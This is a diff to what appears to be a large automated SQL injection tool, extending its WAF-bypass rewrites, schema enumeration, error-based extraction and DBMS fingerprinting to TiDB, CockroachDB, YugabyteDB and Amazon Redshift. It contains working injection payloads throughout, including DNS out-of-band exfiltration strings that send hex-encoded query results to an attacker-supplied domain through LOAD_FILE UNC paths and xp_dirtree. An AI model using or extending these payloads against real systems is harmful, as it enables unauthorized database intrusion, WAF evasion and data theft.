+        # Technique 25: User variable assignment (MySQL/MariaDB/TiDB — no-op otherwise)
+        # BUG-USERVAR-TIDB FIX: TiDB supports SET @var and user variable assignment like MySQL.
+        if dbms in ("MySQL", "MariaDB", "TiDB"):
             try: payload = cls.user_var_bypass(payload)
             except Exception: pass
 
@@ -166673,8 +168610,9 @@ class NovelWAFBypassV18(NovelWAFBypass):
             try: payload = cls.sys_context_bypass(payload)
             except Exception: pass
 
-        # Technique 27: generate_series timing (PostgreSQL — no-op otherwise)
-        if dbms == "PostgreSQL":
+        # Technique 27: generate_series timing (PostgreSQL-family — no-op otherwise)
+        # BUG-GENSERIES-CRDB FIX: CockroachDB/YugabyteDB/Redshift support generate_series.
+        if dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
             try: payload = cls.generate_series_timing(payload)
             except Exception: pass
 
@@ -166693,11 +168631,13 @@ class NovelWAFBypassV18(NovelWAFBypass):
     @staticmethod
     def json_wrap_bypass(payload: str, dbms: str = "MySQL") -> str:
         """Wrap boolean conditions in JSON functions. WAFs never filter JSON_VALID/JSON_VALUE."""
-        if dbms in ("MySQL", "MariaDB"):
+        # BUG-EXOTIC-BYPASS-TIDB FIX: TiDB supports IF() and JSON_VALID() like MySQL.
+        if dbms in ("MySQL", "MariaDB", "TiDB"):
             payload = re.sub(r"AND\s+\(([^)]+)\)", r"AND JSON_VALID(IF(\1,'{\"a\":1}',''))", payload, count=1, flags=re.I)
         elif dbms == "MSSQL":
             payload = re.sub(r"AND\s+\(([^)]+)\)", r"AND JSON_VALUE(IIF(\1,'{\"r\":1}','{\"r\":0}'),'$.r')='1'", payload, count=1, flags=re.I)
-        elif dbms == "PostgreSQL":
+        elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+            # BUG-EXOTIC-BYPASS-CRDB FIX: CockroachDB/YugabyteDB/Redshift support json_build_object like PostgreSQL.
             payload = re.sub(r"AND\s+\(([^)]+)\)", r"AND (json_build_object('c',CASE WHEN \1 THEN 1 ELSE 0 END)->>'c')='1'", payload, count=1, flags=re.I)
         return payload
 
@@ -166712,7 +168652,9 @@ class NovelWAFBypassV18(NovelWAFBypass):
             # Use FOR XML PATH for extraction
             if "FOR XML" not in payload.upper() and "SELECT" in payload.upper():
                 payload = re.sub(r"(--\s*-?\s*$)", r" FOR XML PATH('') \1", payload, count=1)
-        elif dbms == "PostgreSQL":
+        elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB"):
+            # BUG-XML-WRAP-CRDB FIX: CockroachDB and YugabyteDB support xmlserialize/xmlelement.
+            # Amazon Redshift does NOT support XML functions — skip.
             payload = re.sub(r"SELECT\s+(.+?)\s+FROM", r"SELECT xmlserialize(CONTENT xmlelement(name v, \1) AS text) FROM", payload, count=1, flags=re.I)
         return payload
 
@@ -166734,12 +168676,14 @@ class NovelWAFBypassV18(NovelWAFBypass):
     @staticmethod
     def bitwise_bool_bypass(payload: str, dbms: str = "MySQL") -> str:
         """Replace AND/OR conditions with bitwise equivalents."""
-        if dbms in ("MySQL", "MariaDB"):
+        # BUG-EXOTIC-BYPASS-BITWISE-TIDB FIX: TiDB supports BIT_COUNT() like MySQL.
+        if dbms in ("MySQL", "MariaDB", "TiDB"):
             payload = re.sub(r"\bAND\s+1=1\b", "AND BIT_COUNT(1)=1", payload, flags=re.I)
             payload = re.sub(r"\bAND\s+1=2\b", "AND BIT_COUNT(0)=1", payload, flags=re.I)
         elif dbms == "MSSQL":
             payload = re.sub(r"\bAND\s+1=1\b", "AND (1&1)=1", payload, flags=re.I)
-        elif dbms == "PostgreSQL":
+        elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+            # BUG-EXOTIC-BYPASS-BITWISE-CRDB FIX: wire-compatible PG DBMSes support (1&1)::boolean.
             payload = re.sub(r"\bAND\s+1=1\b", "AND (1&1)::boolean", payload, flags=re.I)
         return payload
 
@@ -166789,11 +168733,13 @@ class NovelWAFBypassV18(NovelWAFBypass):
     def apply_exotic_bypass(cls, payload: str, dbms: str = "MySQL") -> str:
         """Apply a random selection of v19.1 exotic bypass techniques."""
         techniques = []
-        if dbms in ("MySQL", "MariaDB"):
+        # BUG-EXOTIC-APPLYBYPASS-TIDB FIX: TiDB is MySQL-wire-compatible; use MySQL techniques.
+        if dbms in ("MySQL", "MariaDB", "TiDB"):
             techniques = [cls.json_wrap_bypass, cls.spatial_bool_bypass,
                           cls.bitwise_bool_bypass, cls.user_var_bypass,
                           cls.mysql_procedure_analyse]
-        elif dbms == "PostgreSQL":
+        elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+            # BUG-EXOTIC-APPLYBYPASS-CRDB FIX: PG-wire-compatible DBMSes share PG techniques.
             techniques = [cls.json_wrap_bypass, cls.bitwise_bool_bypass,
                           cls.generate_series_timing, cls.xml_wrap_bypass]
         elif dbms == "MSSQL":
@@ -167198,7 +169144,8 @@ class TechniqueCascadeEngineV18(TechniqueCascadeEngine):
                 scores[t] *= 0.40   # heavy penalty
 
         # Boost Boolean for time-based targets (to confirm first)
-        if dbms_hint in ("MySQL", "MariaDB", "PostgreSQL", "TiDB"):
+        if dbms_hint in ("MySQL", "MariaDB", "PostgreSQL", "TiDB",
+                          "CockroachDB", "YugabyteDB", "Amazon Redshift"):  # BUG-TECHRANK-NEWDBMS FIX: wire-compat DBMSes also benefit from Boolean/Error-based technique boost
             scores["B"] = scores.get("B", 0.5) * 1.15
             scores["E"] = scores.get("E", 0.5) * 1.10
 
@@ -169059,6 +171006,11 @@ class SchemaEnumeratorV18:
         _se_parent_map = {
             "MariaDB": "MySQL", "TiDB": "MySQL",
             "CockroachDB": "PostgreSQL", "YugabyteDB": "PostgreSQL",
+            # BUG-SE-REDSHIFT-MYSQL-FALLBACK FIX: Amazon Redshift was absent from
+            # _se_parent_map. It fell to self.QUERIES.get("MySQL",{}) which uses
+            # GROUP_CONCAT (MySQL-only), invalid on Redshift. Redshift is PG-wire-
+            # compatible; string_agg() with ORDER BY and LIMIT/OFFSET work correctly.
+            "Amazon Redshift": "PostgreSQL",
             "DuckDB": "PostgreSQL",
             "Sybase": "MSSQL",  # BUG-SE-SYBASE-MYSQL-FALLBACK FIX
         }
@@ -169073,6 +171025,7 @@ class SchemaEnumeratorV18:
             # Try parent DBMS (e.g. MariaDB  MySQL)
             parent_map = {"MariaDB":"MySQL", "TiDB":"MySQL",
                            "CockroachDB":"PostgreSQL", "YugabyteDB":"PostgreSQL",
+                           "Amazon Redshift":"PostgreSQL",  # BUG-SE-REDSHIFT-MYSQL-FALLBACK FIX
                            "DuckDB":"PostgreSQL"}
             parent = parent_map.get(self.dbms)
             if parent:
@@ -169419,8 +171372,11 @@ class SchemaEnumeratorV18:
         # Fix: same pattern as Oracle/MSSQL/PostgreSQL — fall back to exact COUNT(*)
         # using backtick-quoted identifiers.  If COUNT(*) also fails (rare; no SELECT
         # privilege), assume 1 row so dump_rows() at least attempts extraction.
-        elif _parsed == -1 and self.dbms in ("MySQL", "MariaDB"):
-            LOG.info("[SchemaEnumeratorV18] MySQL/MariaDB TABLE_ROWS=NULL for %s.%s "
+        elif _parsed == -1 and self.dbms in ("MySQL", "MariaDB", "TiDB"):
+            # BUG-ROWCOUNT-TIDB FIX: TiDB is MySQL-wire-compatible and uses
+            # information_schema.tables.TABLE_ROWS which can be NULL (→ -1 via COALESCE)
+            # for tables without statistics. Apply exact COUNT(*) fallback with backtick quoting.
+            LOG.info("[SchemaEnumeratorV18] MySQL/MariaDB/TiDB TABLE_ROWS=NULL for %s.%s "
                      "(InnoDB stats absent) — falling back to exact COUNT(*)", db, table)
             if _edb:
                 _sql_exact = self._get_query("row_count_exact", db=_edb, table=table)
@@ -169434,7 +171390,7 @@ class SchemaEnumeratorV18:
             try:
                 return int((_raw_exact or "").strip().replace(",", "").replace(".", ""))
             except (ValueError, AttributeError):
-                LOG.warning("[SchemaEnumeratorV18] MySQL/MariaDB exact COUNT(*) also "
+                LOG.warning("[SchemaEnumeratorV18] MySQL/MariaDB/TiDB exact COUNT(*) also "
                             "failed for %s.%s — assuming 1 row to attempt dump",
                             db, table)
                 return 1
@@ -170827,6 +172783,18 @@ class DBMSQueryPatcherV18:
                     DBMS_QUERIES["MariaDB"][k] = v
             LOG.debug("DBMSQueryPatcherV18: MariaDB queries patched (mirrors MySQL)")
 
+        # BUG-DBMSPATCH-TIDB FIX: TiDB is MySQL-wire-compatible; MYSQL_8_FIXES (utf8mb4
+        # charset, CHAR_LENGTH, GROUP_CONCAT with utf8mb4) apply equally to TiDB.
+        # Without patching, TiDB extraction uses the base TiDB query templates which may
+        # lack utf8mb4 charset declarations, causing incorrect byte-length measurements
+        # for multi-byte columns. Apply the same MySQL 8.x fixes to TiDB.
+        if "TiDB" in DBMS_QUERIES:
+            for k, v in cls.MYSQL_8_FIXES.items():
+                if k not in DBMS_QUERIES["TiDB"] or \
+                        "utf8mb4" not in DBMS_QUERIES["TiDB"].get(k, ""):
+                    DBMS_QUERIES["TiDB"][k] = v
+            LOG.debug("DBMSQueryPatcherV18: TiDB queries patched (mirrors MySQL)")
+
 
 # 
 # 14.  ADDITIONAL BOOLEAN PAYLOADS  edge case expansion
@@ -170923,7 +172891,9 @@ for _bp_entry in BOOLEAN_PAYLOADS_V18:
         # false form from it via _make_false_payload).
         if CERTIFIED_PAYLOAD_DATABASE:
             _v18_payload_str = str(_bp_entry[0])
-            for _v18_dbms in ("MySQL", "PostgreSQL", "MSSQL", "Oracle", "SQLite", "MariaDB"):
+            for _v18_dbms in ("MySQL", "PostgreSQL", "MSSQL", "Oracle", "SQLite", "MariaDB",
+                              "TiDB", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+                # BUG-CPDB-TIDB-CRDB FIX: Also inject v18 payloads for TiDB/CRDB/YugabyteDB/Redshift.
                 try:
                     _v18_cpdb_bool = (CERTIFIED_PAYLOAD_DATABASE
                                       .get(_v18_dbms, {})
@@ -171472,7 +173442,9 @@ def _apply_improvements_v18():
     try:
         for _v18_pair in BOOLEAN_PAYLOADS_V18:
             _v18_p_str = str(_v18_pair[0])
-            for _v18_cpdb_dbms in ("MySQL", "PostgreSQL", "MSSQL", "Oracle", "SQLite", "MariaDB"):
+            for _v18_cpdb_dbms in ("MySQL", "PostgreSQL", "MSSQL", "Oracle", "SQLite", "MariaDB",
+                                    "TiDB", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+                # BUG-CPDB2-TIDB-CRDB FIX: also inject v18 boolean payloads for wire-compat DBMSes.
                 try:
                     _v18_bool_list = (CERTIFIED_PAYLOAD_DATABASE
                                       .get(_v18_cpdb_dbms, {})
@@ -171489,7 +173461,8 @@ def _apply_improvements_v18():
 
     # 6. Verify DBMS_QUERIES has all expected keys (sanity check)
     try:
-        _missing_dbs = [db for db in ("MySQL","MSSQL","PostgreSQL","Oracle","SQLite")
+        _missing_dbs = [db for db in ("MySQL", "MSSQL", "PostgreSQL", "Oracle", "SQLite",
+                                       "TiDB", "CockroachDB", "YugabyteDB", "Amazon Redshift", "MariaDB")  # BUG-DBMS-SANITY-REDSHIFT FIX
                         if db not in DBMS_QUERIES]
         if _missing_dbs:
             LOG.warning(f"_apply_improvements_v18: DBMS_QUERIES missing entries: {_missing_dbs}")
@@ -173363,8 +175336,9 @@ class AdaptiveBinarySearchExtractor:
             # MSSQL/Sybase UNICODE() → BMP [0,65535]; SQLite → [0,1,114,111]
             _effective_hi = (1114111 if _dbms_hint == "SQLite"
                              else 65535)
-        elif _uses_ord_fn or _dbms_hint in ("MySQL", "MariaDB"):
-            # MySQL/MariaDB ORD() returns full Unicode scalar
+        elif _uses_ord_fn or _dbms_hint in ("MySQL", "MariaDB", "TiDB"):
+            # MySQL/MariaDB/TiDB ORD() returns full Unicode scalar (0..U+10FFFF).
+            # BUG-ABSE-TIDB-HI FIX: TiDB is MySQL-wire-compatible; ORD() returns 1,114,111 max.
             _effective_hi = 1114111
         elif _uses_ascii_fn and _dbms_hint in ("PostgreSQL", "CockroachDB",
                                                 "YugabyteDB", "Amazon Redshift", "DuckDB"):
@@ -175058,8 +177032,12 @@ class ConditionalErrorOracle:
         # Numeric safety: these are DBMS alias string mappings used only for dict lookup,
         # never placed inside SQL comparison operands or string delimiters.
         _ceo_dbms_aliases = {
-            "CockroachDB": "PostgreSQL",  # PG-wire-compatible: CAST(… AS INTEGER) works
-            "YugabyteDB":  "PostgreSQL",  # PG-wire-compatible: CAST(… AS INTEGER) works
+            "CockroachDB":    "PostgreSQL",  # PG-wire-compatible: CAST(… AS INTEGER) works
+            "YugabyteDB":     "PostgreSQL",  # PG-wire-compatible: CAST(… AS INTEGER) works
+            # BUG-CEO-REDSHIFT-ALIAS FIX: Amazon Redshift was absent from _ceo_dbms_aliases.
+            # It fell to MySQL templates (RAND/GROUP BY) which are invalid on Redshift.
+            # Redshift is PG-wire-compatible; CAST(… AS INTEGER) triggers an error on Redshift.
+            "Amazon Redshift": "PostgreSQL",
             "TiDB":        "MySQL",       # MySQL-compatible: IF/RAND/GROUP BY works
             "Sybase":      "MSSQL",       # T-SQL-compatible: CASE WHEN … THEN 1/0 works
             "MariaDB":     "MySQL",       # MySQL-compatible
@@ -176287,6 +178265,16 @@ class DNSExfilExtractor:
             # Multi-chunk variant
             "' AND 0x0=LOAD_FILE(CONCAT(CHAR(92),CHAR(92),LOWER(HEX(SUBSTR(({expr}),1,31))),CHAR(46),IF(LENGTH(({expr}))>31,LOWER(HEX(SUBSTR(({expr}),32,31))),CHAR(120)),CHAR(46),'{domain}',CHAR(92),CHAR(120)))-- -",
         ],
+        # BUG-DNSEXFIL-TIDB FIX: TiDB was absent from EXFIL_PAYLOADS; can_exfiltrate()
+        # returned False, disabling DNS OOB for TiDB. TiDB is MySQL-wire-compatible and
+        # supports LOAD_FILE() with UNC paths for DNS OOB (requires FILE privilege and
+        # secure_file_priv='').
+        "TiDB": [
+            # Short values ≤31 bytes — one DNS label (UNC path via LOAD_FILE)
+            "' AND 0x0=LOAD_FILE(CONCAT(CHAR(92),CHAR(92),LOWER(HEX(SUBSTR(({expr}),1,31))),CHAR(46),'{domain}',CHAR(92),CHAR(120)))-- -",
+            # Multi-chunk: bytes 1-31 in first label, bytes 32-62 in second
+            "' AND 0x0=LOAD_FILE(CONCAT(CHAR(92),CHAR(92),LOWER(HEX(SUBSTR(({expr}),1,31))),CHAR(46),IF(LENGTH(({expr}))>31,LOWER(HEX(SUBSTR(({expr}),32,31))),CHAR(120)),CHAR(46),'{domain}',CHAR(92),CHAR(120)))-- -",
+        ],
         "MSSQL": [
             # Short values — MSSQL: chunk1 (bytes 1-31 in hex) as first label
             "'; DECLARE @_sqrd VARCHAR(999),@_sqrh VARCHAR(999);SET @_sqrd=LOWER(CONVERT(VARCHAR(62),CONVERT(VARBINARY(31),({expr})),2));SET @_sqrh=CHAR(92)+CHAR(92)+@_sqrd+CHAR(46)+'{domain}'+CHAR(92)+CHAR(120);EXEC master..xp_dirtree @_sqrh-- -",
@@ -176327,9 +178315,16 @@ class DNSExfilExtractor:
         # MySQL: LOWER(HEX(...)) to ensure lowercase for polling hex validation.
         "MySQL":      "LOWER(HEX(({expr})))",
         "MariaDB":    "LOWER(HEX(({expr})))",
+        # BUG-HEXEXPR-TIDB FIX: TiDB is MySQL-wire-compatible; HEX() works identically.
+        "TiDB":       "LOWER(HEX(({expr})))",
         "MSSQL":      "LOWER(CONVERT(VARCHAR(MAX),CONVERT(VARBINARY(MAX),({expr})),2))",
         "PostgreSQL": "encode(({expr})::bytea,$$hex$$)",
         "Oracle":     "LOWER(RAWTOHEX(UTL_RAW.CAST_TO_RAW(({expr}))))",
+        # CockroachDB/YugabyteDB: encode(bytea,'hex') — same as PG.
+        "CockroachDB":    "encode(({expr})::bytea,$$hex$$)",
+        "YugabyteDB":     "encode(({expr})::bytea,$$hex$$)",
+        # Redshift supports encode(bytea,'hex') via PG compat.
+        "Amazon Redshift": "encode(({expr})::bytea,$$hex$$)",
     }
     
     def __init__(self, engine, config, method, url, data, data_fmt, param, original,
@@ -177193,8 +179188,12 @@ class ErrorBasedExtractor:
         # always fail; the extractor returned None after wasting N requests.
         # Fix: map PostgreSQL-compatible wire-protocol DBMSes to PostgreSQL templates;
         # return None for completely unknown DBMSes (blind paths handle extraction).
+        # BUG-ERREXT-TIDB-FALLBACK FIX: TiDB was absent from _mysql_compat → fell to
+        # self.CAST_TEMPLATES.get("TiDB", []) → empty list → return None immediately.
+        # TiDB is MySQL-wire-compatible and supports EXTRACTVALUE() and UPDATEXML()
+        # identically to MySQL. Use MySQL templates.
         _pg_compat = {"CockroachDB", "YugabyteDB", "Amazon Redshift"}
-        _mysql_compat = {"MariaDB"}  # already has its own entry; guard for safety
+        _mysql_compat = {"MariaDB", "TiDB"}  # TiDB is MySQL-wire-compat: supports EXTRACTVALUE/UPDATEXML
         if dbms in _pg_compat:
             templates = self.CAST_TEMPLATES.get("PostgreSQL", [])
         elif dbms in _mysql_compat:
@@ -177362,7 +179361,17 @@ class ErrorBasedExtractor:
         results = {}
         _queries = {
             "MySQL": {"version": "VERSION()", "database": "DATABASE()", "user": "CURRENT_USER()"},
+            "MariaDB": {"version": "VERSION()", "database": "DATABASE()", "user": "CURRENT_USER()"},
+            # BUG-ERREXT-BASICINFO-TIDB FIX: TiDB absent; fell to MySQL-style fallback
+            # {"version":"VERSION()","database":"DATABASE()","user":"USER()"} — actually
+            # correct for TiDB, but TIDB_VERSION() gives richer output.
+            "TiDB": {"version": "TIDB_VERSION()", "database": "DATABASE()", "user": "CURRENT_USER()"},
             "PostgreSQL": {"version": "version()", "database": "current_database()", "user": "current_user"},
+            # BUG-ERREXT-BASICINFO-PG-COMPAT FIX: CockroachDB/YugabyteDB/Redshift absent;
+            # fell to MySQL-style fallback which uses DATABASE() (invalid in PG-wire DBMSes).
+            "CockroachDB":    {"version": "version()", "database": "current_database()", "user": "current_user"},
+            "YugabyteDB":     {"version": "yb_server_version()", "database": "current_database()", "user": "current_user"},
+            "Amazon Redshift": {"version": "version()", "database": "current_database()", "user": "current_user"},
             "MSSQL": {"version": "@@VERSION", "database": "DB_NAME()", "user": "SYSTEM_USER"},
             "Oracle": {"version": "(SELECT BANNER FROM v$version WHERE ROWNUM=1)", "user": "USER"},
             "SQLite": {"version": "sqlite_version()"},
@@ -177376,9 +179385,17 @@ class ErrorBasedExtractor:
         
         # Also try to get table count (bonus extraction)
         _table_exprs = {
-            "MySQL": "(SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE())",
+            "MySQL":    "(SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE())",
+            "MariaDB":  "(SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE())",
+            # BUG-ERREXT-TABLECOUNT-TIDB FIX: TiDB absent; no table count extraction.
+            # TiDB uses MySQL-compat information_schema with database() function.
+            "TiDB":     "(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database() AND table_type='BASE TABLE')",
             "PostgreSQL": "(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='public')",
-            "MSSQL": "(SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES)",
+            # BUG-ERREXT-TABLECOUNT-PG-COMPAT FIX: CockroachDB/YugabyteDB/Redshift absent.
+            "CockroachDB":     "(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='public')",
+            "YugabyteDB":      "(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='public')",
+            "Amazon Redshift": "(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='public')",
+            "MSSQL":    "(SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES)",
         }
         _tq = _table_exprs.get(dbms)
         if _tq:
@@ -177659,6 +179676,14 @@ class DBMSEliminator:
         "MSSQL": ["microsoft sql", "mssql", "sqlserver", "msg 156", "msg 105"],
         "Oracle": ["oracle", "ora-0", "tns:", "plsql"],
         "SQLite": ["sqlite", "sqlite3", "no such table"],
+        # BUG-DBMSFP-NEWDBMS FIX: TiDB/CockroachDB/YugabyteDB/Redshift absent from
+        # DBMS_FINGERPRINTS. Their distinctive error messages and banner fragments
+        # never scored → DBMS detection relied solely on probe results, missing the
+        # fast fingerprint path for these DBMSes.
+        "TiDB":           ["tidb", "tidb_version", "tidb_server"],
+        "CockroachDB":    ["crdb_internal", "cockroach", "cockroachdb"],
+        "YugabyteDB":     ["yugabyte", "yb_server_version", "yugabytedb"],
+        "Amazon Redshift": ["amazon redshift", "redshift", "padb_harvest"],
     }
     
     def __init__(self):
@@ -184004,7 +186029,7 @@ except Exception as _cpdb_err:
 # With warm-up: all common (level=1..3) combinations are pre-computed once, giving
 # near-100% cache hits on all subsequent scan calls.
 try:
-    _WARMUP_DBMS = ["MySQL", "MariaDB", "PostgreSQL", "MSSQL", "Oracle", "SQLite"]
+    _WARMUP_DBMS = ["MySQL", "MariaDB", "TiDB", "PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "MSSQL", "Oracle", "SQLite"]  # BUG-WARMUP-NEWDBMS FIX: added TiDB/CockroachDB/YugabyteDB/Amazon Redshift so their payload combinations are pre-computed at startup
     _WARMUP_TECHS = ["E","EH","B","BH","T","TH","S","DS","U","UE","HQ","IN","BT","ST","NV","WB","EX","HY","SO","UH","O"]
     _WARMUP_LEVELS = [1, 3, 5]
     _warmup_count = 0
